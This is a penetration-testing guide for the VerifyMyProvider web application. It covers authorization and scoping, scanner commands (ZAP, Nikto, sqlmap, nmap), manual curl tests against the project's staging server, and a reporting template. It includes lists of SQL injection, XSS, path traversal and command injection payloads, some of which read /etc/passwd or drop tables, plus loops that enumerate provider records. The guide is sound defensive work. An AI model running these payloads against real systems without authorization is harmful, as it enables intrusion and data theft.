# Penetration Testing Guide

This document provides a comprehensive guide for conducting security assessments of the VerifyMyProvider application.

## Table of Contents

1. [Overview](#overview)
2. [Pre-Test Checklist](#pre-test-checklist)
3. [Automated Scanning Tools](#automated-scanning-tools)
4. [Manual Testing Checklist](#manual-testing-checklist)
5. [Test Payloads](#test-payloads)
6. [Reporting Template](#reporting-template)
7. [Post-Test Actions](#post-test-actions)

---

## Overview

### Testing Frequency

| Trigger | Recommended Action |
|---------|-------------------|
| Quarterly | Full penetration test |
| Before major releases | Focused security review |
| After security incidents | Targeted assessment |
| New feature deployment | Feature-specific testing |
| Dependency updates | Vulnerability scan |

### Scope

| Component | In Scope | Notes |
|-----------|----------|-------|
| API Endpoints | ✅ | All `/api/v1/*` routes |
| Admin Endpoints | ✅ | `/api/v1/admin/*` (with auth) |
| Frontend Application | ✅ | Next.js app, client-side code |
| Cloud Infrastructure | ✅ | Cloud Run, Cloud SQL, Redis |
| Third-party Services | ⚠️ | Only our integration points |
| NPI Registry API | ❌ | External service, out of scope |

### Testing Types

1. **Automated Scanning**: Use tools to find common vulnerabilities
2. **Manual Testing**: Human-driven exploration of business logic
3. **Configuration Review**: Check infrastructure settings
4. **Code Review**: Static analysis of source code

### Test Environment Options

| Environment | Pros | Cons |
|-------------|------|------|
| Production | Real-world conditions | Risk of disruption |
| Staging | Production-like | May differ from prod |
| Local | Safe, isolated | May miss infra issues |

**Recommendation**: Use staging environment for most testing, production only for final verification with extreme care.

---

## Pre-Test Checklist

Complete these items before beginning any penetration testing:

### Preparation

- [ ] **Schedule testing window** with team
  - Notify: DevOps, Backend, Frontend teams
  - Preferred: Low-traffic hours (nights/weekends)
  - Duration: Typically 4-8 hours for full test

- [ ] **Create database backup**
  ```bash
  # Create manual backup before testing
  ./scripts/verify-backups.sh create "Pre-pentest backup $(date +%Y-%m-%d)"
  ```

- [ ] **Document baseline metrics**
  - Current error rates
  - Response times
  - Active user count
  - Rate limiter state

- [ ] **Prepare test environment** (if using staging)
  ```bash
  # Verify staging is up-to-date with production code
  git log --oneline -1  # Note current commit

  # Verify staging database has recent data
  curl -s https://staging.verifymyprovider.com/health | jq
  ```

- [ ] **Prepare incident response contacts**

  | Role | Contact | When to Notify |
  |------|---------|----------------|
  | On-call Engineer | [Slack/Phone] | Any production impact |
  | Security Lead | [Email] | Critical findings |
  | DevOps | [Slack] | Infrastructure issues |

- [ ] **Review previous test results**
  - Check if past vulnerabilities were fixed
  - Note any new features since last test

- [ ] **Obtain authorization**
  - Written approval from project owner
  - Defined scope and rules of engagement
  - Emergency stop procedures

### Tools Setup

- [ ] Install/update OWASP ZAP
- [ ] Install/update Nikto
- [ ] Install/update sqlmap
- [ ] Install/update nmap
- [ ] Prepare custom scripts (if any)
- [ ] Configure proxy for traffic interception

---

## Automated Scanning Tools

### OWASP ZAP (Zed Attack Proxy)

**Purpose**: Comprehensive web application security scanner

**Installation**:
```bash
# macOS
brew install --cask owasp-zap

# Linux (Debian/Ubuntu)
sudo apt install zaproxy

# Docker
docker pull owasp/zap2docker-stable
```

**Basic Scan**:
```bash
# Quick spider and scan
zap-cli quick-scan --self-contained \
  --start-options '-config api.disablekey=true' \
  https://staging.verifymyprovider.com

# Full scan with API
zap-cli start --start-options '-config api.disablekey=true'
zap-cli open-url https://staging.verifymyprovider.com
zap-cli spider https://staging.verifymyprovider.com
zap-cli active-scan https://staging.verifymyprovider.com
zap-cli report -o zap-report.html -f html
zap-cli shutdown
```

**Docker Full Scan**:
```bash
docker run -v $(pwd):/zap/wrk/:rw -t owasp/zap2docker-stable zap-full-scan.py \
  -t https://staging.verifymyprovider.com \
  -r zap-report.html \
  -w zap-report.md
```

**API Scan** (with OpenAPI spec):
```bash
docker run -v $(pwd):/zap/wrk/:rw -t owasp/zap2docker-stable zap-api-scan.py \
  -t https://staging.verifymyprovider.com/api/v1/openapi.json \
  -f openapi \
  -r api-scan-report.html
```

**Configuration Notes**:
- Exclude rate-limited endpoints from aggressive scanning
- Set appropriate scan policy (Low/Medium/High)
- Configure authentication if testing protected endpoints

---

### Nikto

**Purpose**: Web server vulnerability scanner

**Installation**:
```bash
# macOS
brew install nikto

# Linux
sudo apt install nikto

# From source
git clone https://github.com/sullo/nikto
cd nikto/program
./nikto.pl -Version
```

**Basic Scan**:
```bash
nikto -h https://staging.verifymyprovider.com -o nikto-report.html -Format html
```

**Comprehensive Scan**:
```bash
nikto -h https://staging.verifymyprovider.com \
  -Tuning 123457890abc \
  -timeout 10 \
  -o nikto-full-report.html \
  -Format html
```

**Specific Tests**:
```bash
# Test for specific vulnerabilities
nikto -h https://staging.verifymyprovider.com -Tuning 9  # SQL injection
nikto -h https://staging.verifymyprovider.com -Tuning 4  # XSS
```

---

### sqlmap

**Purpose**: Automated SQL injection testing

**⚠️ WARNING**: Only use against test environments. Never run against production databases.

**Installation**:
```bash
# macOS/Linux
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git
cd sqlmap
python sqlmap.py --version

# pip
pip install sqlmap
```

**Basic Test**:
```bash
# Test a specific parameter
sqlmap -u "https://staging.verifymyprovider.com/api/v1/providers/search?name=test" \
  --batch \
  --level=2 \
  --risk=2

# Test with specific parameter
sqlmap -u "https://staging.verifymyprovider.com/api/v1/providers/search" \
  --data="name=test&state=NY" \
  --batch
```

**POST Request Testing**:
```bash
# Save request to file first
cat > request.txt << 'EOF'
POST /api/v1/verify HTTP/1.1
Host: staging.verifymyprovider.com
Content-Type: application/json

{"npi":"1234567890","planId":"test","acceptsInsurance":true}
EOF

sqlmap -r request.txt --batch --level=3
```

**Specific Database Testing**:
```bash
# PostgreSQL-specific tests
sqlmap -u "https://staging.verifymyprovider.com/api/v1/providers/search?name=test" \
  --dbms=PostgreSQL \
  --batch \
  --tables
```

---

### nmap

**Purpose**: Network and port scanning

**Installation**:
```bash
# macOS
brew install nmap

# Linux
sudo apt install nmap
```

**Basic Scan**:
```bash
# Scan for open ports
nmap -sT -sV staging.verifymyprovider.com

# Scan specific ports
nmap -p 80,443,5432,6379 staging.verifymyprovider.com
```

**Service Detection**:
```bash
nmap -sV -sC staging.verifymyprovider.com -oN nmap-report.txt
```

**Vulnerability Scripts**:
```bash
nmap --script vuln staging.verifymyprovider.com
```

**Note**: Cloud Run services may not respond to typical port scans. Focus on HTTP/HTTPS testing.

---

### Additional Tools

**curl** - Manual HTTP testing:
```bash
# Test endpoint responses
curl -v https://staging.verifymyprovider.com/health

# Test with custom headers
curl -H "X-Admin-Secret: test" https://staging.verifymyprovider.com/api/v1/admin/health

# Test POST with payload
curl -X POST -H "Content-Type: application/json" \
  -d '{"npi":"1234567890","planId":"test","acceptsInsurance":true}' \
  https://staging.verifymyprovider.com/api/v1/verify
```

**httpie** - User-friendly HTTP client:
```bash
# Install
pip install httpie

# Usage
http https://staging.verifymyprovider.com/health
http POST https://staging.verifymyprovider.com/api/v1/verify npi=1234567890 planId=test acceptsInsurance:=true
```

---

## Manual Testing Checklist

### Authentication & Authorization

#### Admin Endpoint Security

- [ ] **Missing authentication header**
  ```bash
  curl -v https://staging.verifymyprovider.com/api/v1/admin/health
  # Expected: 401 Unauthorized or 503 Service Unavailable
  ```

- [ ] **Invalid secret**
  ```bash
  curl -v -H "X-Admin-Secret: wrong-secret" \
    https://staging.verifymyprovider.com/api/v1/admin/health
  # Expected: 401 Unauthorized
  ```

- [ ] **Empty secret**
  ```bash
  curl -v -H "X-Admin-Secret: " \
    https://staging.verifymyprovider.com/api/v1/admin/health
  # Expected: 401 Unauthorized
  ```

- [ ] **Timing attack on secret comparison**
  ```bash
  # Compare response times for different secret lengths
  # Valid secrets should take constant time regardless of input
  for secret in "a" "ab" "abc" "abcd" "abcde"; do
    time curl -s -H "X-Admin-Secret: $secret" \
      https://staging.verifymyprovider.com/api/v1/admin/health > /dev/null
  done
  # Times should be consistent (timing-safe comparison)
  ```

- [ ] **Header case sensitivity**
  ```bash
  curl -H "x-admin-secret: valid-secret" \  # lowercase
    https://staging.verifymyprovider.com/api/v1/admin/health
  ```

---

### Input Validation

#### SQL Injection Testing

- [ ] **Search parameters**
  ```bash
  # Name parameter
  curl "https://staging.verifymyprovider.com/api/v1/providers/search?name=test'%20OR%20'1'='1"

  # State parameter
  curl "https://staging.verifymyprovider.com/api/v1/providers/search?state=NY'--"

  # NPI parameter
  curl "https://staging.verifymyprovider.com/api/v1/providers/search?npi=1234567890'%20UNION%20SELECT"
  ```

- [ ] **Path parameters**
  ```bash
  curl "https://staging.verifymyprovider.com/api/v1/providers/1234567890';DROP%20TABLE%20providers;--"
  ```

- [ ] **JSON body injection**
  ```bash
  curl -X POST -H "Content-Type: application/json" \
    -d '{"npi":"1234567890\" OR \"1\"=\"1","planId":"test","acceptsInsurance":true}' \
    https://staging.verifymyprovider.com/api/v1/verify
  ```

#### XSS Testing

- [ ] **Verification notes field**
  ```bash
  curl -X POST -H "Content-Type: application/json" \
    -d '{"npi":"1234567890","planId":"test","acceptsInsurance":true,"notes":"<script>alert(1)</script>"}' \
    https://staging.verifymyprovider.com/api/v1/verify
  ```

- [ ] **Search parameters reflected in response**
  ```bash
  curl "https://staging.verifymyprovider.com/api/v1/providers/search?name=<img%20src=x%20onerror=alert(1)>"
  ```

- [ ] **Evidence URL field**
  ```bash
  curl -X POST -H "Content-Type: application/json" \
    -d '{"npi":"1234567890","planId":"test","acceptsInsurance":true,"evidenceUrl":"javascript:alert(1)"}' \
    https://staging.verifymyprovider.com/api/v1/verify
  ```

#### Input Format Bypass

- [ ] **NPI format validation**
  ```bash
  # Too short
  curl "https://staging.verifymyprovider.com/api/v1/providers/123"

  # Too long
  curl "https://staging.verifymyprovider.com/api/v1/providers/12345678901234567890"

  # Non-numeric
  curl "https://staging.verifymyprovider.com/api/v1/providers/ABCDEFGHIJ"

  # Mixed
  curl "https://staging.verifymyprovider.com/api/v1/providers/12345ABCDE"
  ```

- [ ] **State code validation**
  ```bash
  curl "https://staging.verifymyprovider.com/api/v1/providers/search?state=INVALID"
  curl "https://staging.verifymyprovider.com/api/v1/providers/search?state=X"
  curl "https://staging.verifymyprovider.com/api/v1/providers/search?state=123"
  ```

#### Payload Size Testing

- [ ] **Oversized JSON payload**
  ```bash
  # Generate large payload
  python3 -c "print('{\"notes\":\"' + 'A'*1000000 + '\"}')" | \
    curl -X POST -H "Content-Type: application/json" \
    -d @- https://staging.verifymyprovider.com/api/v1/verify
  # Expected: 413 Payload Too Large
  ```

- [ ] **Deeply nested JSON**
  ```bash
  python3 -c "print('{' + '\"a\":{' * 100 + '\"b\":1' + '}' * 100 + '}')" | \
    curl -X POST -H "Content-Type: application/json" \
    -d @- https://staging.verifymyprovider.com/api/v1/verify
  ```

- [ ] **Malformed JSON**
  ```bash
  curl -X POST -H "Content-Type: application/json" \
    -d '{invalid json}' \
    https://staging.verifymyprovider.com/api/v1/verify
  # Expected: 400 Bad Request
  ```

---

### Rate Limiting

- [ ] **Verify limits enforced**
  ```bash
  # Rapid requests to trigger rate limit
  for i in {1..250}; do
    curl -s -o /dev/null -w "%{http_code}\n" \
      https://staging.verifymyprovider.com/api/v1/providers/search?name=test
  done | sort | uniq -c
  # Should see 429 responses after limit exceeded
  ```

- [ ] **Sliding window behavior**
  ```bash
  # Send requests at boundary of time window
  # Verify old requests expire correctly
  ```

- [ ] **Different endpoints have appropriate limits**
  ```bash
  # Search endpoint (higher limit)
  # Verification endpoint (lower limit)
  # Vote endpoint (lower limit)
  ```

- [ ] **Rate limit headers**
  ```bash
  curl -v https://staging.verifymyprovider.com/api/v1/providers/search?name=test 2>&1 | grep -i "x-ratelimit"
  # Check for: X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Reset
  ```

- [ ] **IP-based vs other identifiers**
  ```bash
  # Test from different IPs if possible
  # Verify limits are per-IP
  ```

---

### CAPTCHA Validation

- [ ] **Missing CAPTCHA token**
  ```bash
  curl -X POST -H "Content-Type: application/json" \
    -d '{"npi":"1234567890","planId":"test","acceptsInsurance":true}' \
    https://staging.verifymyprovider.com/api/v1/verify
  # Expected: 400 or 403 (depending on config)
  ```

- [ ] **Invalid CAPTCHA token**
  ```bash
  curl -X POST -H "Content-Type: application/json" \
    -d '{"npi":"1234567890","planId":"test","acceptsInsurance":true,"captchaToken":"invalid-token"}' \
    https://staging.verifymyprovider.com/api/v1/verify
  # Expected: 403 Forbidden
  ```

- [ ] **Expired CAPTCHA token**
  ```bash
  # Use a token that was valid but is now expired (>2 minutes old)
  ```

- [ ] **Token replay attack**
  ```bash
  # Use same valid token twice
  # Second request should be rejected
  ```

---

### Business Logic

- [ ] **Vote manipulation**
  ```bash
  # Same IP voting multiple times
  for i in {1..10}; do
    curl -X POST -H "Content-Type: application/json" \
      -d '{"vote":"up"}' \
      https://staging.verifymyprovider.com/api/v1/verify/VERIFICATION_ID/vote
  done
  # Should only count as one vote
  ```

- [ ] **Vote changing**
  ```bash
  # Change vote from up to down
  curl -X POST -H "Content-Type: application/json" \
    -d '{"vote":"up"}' \
    https://staging.verifymyprovider.com/api/v1/verify/VERIFICATION_ID/vote

  curl -X POST -H "Content-Type: application/json" \
    -d '{"vote":"down"}' \
    https://staging.verifymyprovider.com/api/v1/verify/VERIFICATION_ID/vote
  # Should update vote, not create duplicate
  ```

- [ ] **Sybil attack simulation**
  ```bash
  # Attempt to create many verifications for same provider-plan
  # Check if confidence score is manipulable
  ```

- [ ] **Data enumeration**
  ```bash
  # Try to enumerate all NPIs
  for i in {1000000000..1000000100}; do
    response=$(curl -s "https://staging.verifymyprovider.com/api/v1/providers/$i")
    if ! echo "$response" | grep -q "not found"; then
      echo "Found: $i"
    fi
  done
  ```

- [ ] **Search result pagination**
  ```bash
  # Request excessive page sizes
  curl "https://staging.verifymyprovider.com/api/v1/providers/search?limit=10000"
  # Should be capped

  # Request negative pages
  curl "https://staging.verifymyprovider.com/api/v1/providers/search?page=-1"
  ```

---

### Infrastructure

- [ ] **HTTP methods**
  ```bash
  # Test unsupported methods
  curl -X DELETE https://staging.verifymyprovider.com/api/v1/providers/1234567890
  curl -X PUT https://staging.verifymyprovider.com/api/v1/providers/1234567890
  curl -X PATCH https://staging.verifymyprovider.com/api/v1/providers/1234567890
  # Expected: 404 or 405
  ```

- [ ] **Security headers**
  ```bash
  curl -v https://staging.verifymyprovider.com/health 2>&1 | grep -E "^< (X-|Content-Security|Strict-Transport)"
  # Check for: CSP, HSTS, X-Frame-Options, X-Content-Type-Options
  ```

- [ ] **CORS policy**
  ```bash
  curl -v -H "Origin: https://evil.com" \
    https://staging.verifymyprovider.com/api/v1/providers/search?name=test 2>&1 | grep -i "access-control"
  # Should not allow arbitrary origins
  ```

- [ ] **Error message information disclosure**
  ```bash
  # Trigger errors and check for stack traces or internal details
  curl "https://staging.verifymyprovider.com/api/v1/providers/invalid"
  curl -X POST -H "Content-Type: application/json" \
    -d 'not json' \
    https://staging.verifymyprovider.com/api/v1/verify
  ```

---

## Test Payloads

### SQL Injection Payloads

Save to `payloads/sqli.txt`:

```
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
" OR "1"="1
" OR "1"="1"--
1' ORDER BY 1--
1' ORDER BY 10--
1' UNION SELECT NULL--
1' UNION SELECT NULL,NULL--
1' UNION SELECT username,password FROM users--
'; DROP TABLE providers;--
' AND 1=1--
' AND 1=2--
' WAITFOR DELAY '0:0:5'--
'; EXEC xp_cmdshell('whoami');--
1; SELECT pg_sleep(5);--
' || pg_sleep(5)--
```

### XSS Payloads

Save to `payloads/xss.txt`:

```
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
<iframe src="javascript:alert('XSS')">
<input onfocus=alert('XSS') autofocus>
"><script>alert('XSS')</script>
'><script>alert('XSS')</script>
<img src="x" onerror="alert('XSS')">
<svg/onload=alert('XSS')>
<math><maction xlink:href="javascript:alert('XSS')">
javascript:alert('XSS')
data:text/html,<script>alert('XSS')</script>
<div style="background:url('javascript:alert(1)')">
<style>@import'javascript:alert(1)'</style>
```

### Path Traversal Payloads

Save to `payloads/path-traversal.txt`:

```
../
..%2f
..%252f
....//
..%c0%af
..%c1%9c
..\/
..\
%2e%2e%2f
%2e%2e/
..%2f
%2e%2e%5c
..%00/
..%0d/
..%5c
..%ff/
/etc/passwd
/etc/shadow
C:\Windows\System32\config\SAM
....//....//etc/passwd
..%252f..%252f..%252fetc/passwd
```

### Command Injection Payloads

Save to `payloads/command-injection.txt`:

```
; ls -la
| ls -la
& ls -la
&& ls -la
|| ls -la
`ls -la`
$(ls -la)
; cat /etc/passwd
| cat /etc/passwd
; whoami
| whoami
; id
; uname -a
`id`
$(whoami)
```

### Using Payloads with Tools

```bash
# Test all SQLi payloads against a parameter
while read payload; do
  encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$payload'''))")
  response=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://staging.verifymyprovider.com/api/v1/providers/search?name=$encoded")
  echo "$response: $payload"
done < payloads/sqli.txt
```

---

## Reporting Template

### Vulnerability Report Format

```markdown
# Vulnerability Report: [Title]

## Summary
[Brief description of the vulnerability]

## Severity
- [ ] Critical (system compromise, data breach)
- [ ] High (significant security impact)
- [ ] Medium (limited security impact)
- [ ] Low (minimal security impact)
- [ ] Informational (best practice violation)

## CVSS Score
[If applicable, calculate CVSS v3.1 score]

## Affected Component
- Endpoint: [URL/path]
- Parameter: [affected parameter]
- Component: [frontend/backend/infrastructure]

## Description
[Detailed description of the vulnerability, including:
- What the vulnerability is
- Why it's a security concern
- What an attacker could do]

## Steps to Reproduce
1. [Step 1]
2. [Step 2]
3. [Step 3]

## Proof of Concept
```bash
[curl command or code to reproduce]
```

## Evidence
[Screenshots, response bodies, logs]

## Impact
[Describe the potential impact:
- Confidentiality
- Integrity
- Availability]

## Recommended Fix
[Specific recommendations for fixing the vulnerability]

## References
- [Link to relevant security guidance]
- [CVE numbers if applicable]

## Verification
- [ ] Fix implemented
- [ ] Retested on: [date]
- [ ] Verified fixed by: [tester name]
```

### Example Report

```markdown
# Vulnerability Report: SQL Injection in Provider Search

## Summary
The provider search endpoint is vulnerable to SQL injection through the `name` parameter.

## Severity
- [x] High (significant security impact)

## CVSS Score
7.5 (High) - CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N

## Affected Component
- Endpoint: GET /api/v1/providers/search
- Parameter: name
- Component: backend

## Description
The `name` query parameter is not properly sanitized before being used in a database query. An attacker can inject SQL commands to extract data from the database.

## Steps to Reproduce
1. Navigate to the provider search endpoint
2. Add a SQL injection payload to the name parameter
3. Observe the modified response indicating injection success

## Proof of Concept
```bash
curl "https://api.verifymyprovider.com/api/v1/providers/search?name=test'%20OR%20'1'='1"
```

## Evidence
Response returned all providers instead of only those matching "test".

## Impact
- Confidentiality: HIGH - Attacker can read entire database
- Integrity: MEDIUM - Potential for data modification
- Availability: LOW - Potential for DoS via heavy queries

## Recommended Fix
1. Use parameterized queries (Prisma ORM handles this)
2. Validate input format before query
3. Add WAF rule for SQL injection patterns

## References
- https://owasp.org/www-community/attacks/SQL_Injection
- CWE-89: SQL Injection

## Verification
- [x] Fix implemented: Added input validation
- [x] Retested on: 2024-01-15
- [x] Verified fixed by: Security Team
```

---

## Post-Test Actions

### Immediate Actions

- [ ] **Document all findings**
  - Complete vulnerability reports for each issue
  - Include all evidence and reproduction steps
  - Classify by severity

- [ ] **Notify stakeholders of critical findings**
  - Critical/High issues: Immediate notification
  - Medium/Low: Include in report

- [ ] **Secure any exposed data**
  - If data was accessed during testing, ensure it's deleted
  - Rotate any credentials that were exposed

### Remediation

- [ ] **Prioritize fixes**

  | Severity | Response Time |
  |----------|---------------|
  | Critical | Immediate (24 hours) |
  | High | 1-3 days |
  | Medium | 1-2 weeks |
  | Low | Next sprint |
  | Informational | Backlog |

- [ ] **Create tickets for each finding**
  - Link to vulnerability report
  - Assign to appropriate team
  - Set due date based on severity

- [ ] **Implement fixes**
  - Follow secure coding guidelines
  - Code review required
  - Test fix in staging first

### Verification

- [ ] **Retest after remediation**
  - Use same test cases that found the issue
  - Verify fix doesn't break functionality
  - Check for regression in related areas

- [ ] **Update documentation**
  - Update KNOWN-ISSUES.md if needed
  - Document any new security controls
  - Update this testing guide if new tests needed

### Archive

- [ ] **Archive test results**
  ```
  security-tests/
  ├── 2024-01-15/
  │   ├── zap-report.html
  │   ├── nikto-report.txt
  │   ├── manual-testing-notes.md
  │   ├── vulnerability-reports/
  │   │   ├── VULN-001-sqli-search.md
  │   │   └── VULN-002-xss-notes.md
  │   └── summary.md
  ```

- [ ] **Update security metrics**
  - Track vulnerabilities found over time
  - Monitor fix rates
  - Compare to previous tests

- [ ] **Schedule next test**
  - Quarterly for routine
  - Before major releases
  - After significant changes

### Lessons Learned

- [ ] **Conduct retrospective**
  - What vulnerabilities were missed before?
  - What new attack vectors should be added?
  - Were tools effective?

- [ ] **Update testing procedures**
  - Add new test cases based on findings
  - Update tool configurations
  - Improve automation

---

## Quick Reference

### One-liner Tests

```bash
# Health check
curl -s https://staging.verifymyprovider.com/health | jq

# Check security headers
curl -sI https://staging.verifymyprovider.com | grep -iE "^(x-|content-security|strict)"

# Test admin auth
curl -s -o /dev/null -w "%{http_code}" https://staging.verifymyprovider.com/api/v1/admin/health

# Quick SQLi test
curl -s "https://staging.verifymyprovider.com/api/v1/providers/search?name=test'" | head -20

# Quick XSS test
curl -s "https://staging.verifymyprovider.com/api/v1/providers/search?name=<script>alert(1)</script>"

# Rate limit test
for i in {1..100}; do curl -s -o /dev/null -w "%{http_code} " https://staging.verifymyprovider.com/health; done

# Check CORS
curl -sI -H "Origin: https://evil.com" https://staging.verifymyprovider.com/api/v1/providers/search | grep -i access-control
```

### Emergency Contacts

| Role | Contact | Availability |
|------|---------|--------------|
| Security Lead | [email] | Business hours |
| On-call Engineer | [pager] | 24/7 |
| DevOps | [slack] | Business hours |

---

## Appendix: Compliance Mapping

| Test Category | OWASP Top 10 | CWE |
|--------------|--------------|-----|
| SQL Injection | A03:2021 | CWE-89 |
| XSS | A03:2021 | CWE-79 |
| Authentication | A07:2021 | CWE-287 |
| Rate Limiting | A04:2021 | CWE-770 |
| Input Validation | A03:2021 | CWE-20 |
| Security Headers | A05:2021 | CWE-693 |
